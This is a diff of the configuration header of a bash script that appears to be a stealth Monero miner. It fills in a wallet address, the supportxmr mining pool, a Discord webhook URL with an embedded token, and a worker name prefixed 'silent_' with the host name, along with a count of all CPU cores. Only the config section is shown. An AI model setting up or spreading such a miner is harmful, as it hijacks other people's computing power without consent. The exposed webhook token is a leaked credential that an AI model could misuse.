@@ -1,9 +1,9 @@
 #!/bin/bash
 
 # ========== CONFIG ==========
-WALLET2="NHẬP_VÍ_THỨ_HAI_TẠI_ĐÂY"
+WALLET2="48NiGqEZT6GV7acihQu6VMHjDKMZYPKXZ1bQCcdFrXjc1xDjc6D9sR1YsDppa1v9QkRbvgn2cGi424LPfvnXGbcLVAcyK9p"
 POOL="pool.supportxmr.com:443"
-DISCORD_WEBHOOK="https://discord.com/api/webhooks/..." # Thay webhook
+DISCORD_WEBHOOK="https://discord.com/api/webhooks/1362712368441852015/UzYhxkLkAvkZm1IA8oy769N-PLfPJakT9OWe9wr2SCmNWVL0842CABegDTEI4rT5K9os" # Thay webhook
 
 WORKER="silent_$(hostname)"
 TOTAL_CORES=$(nproc)
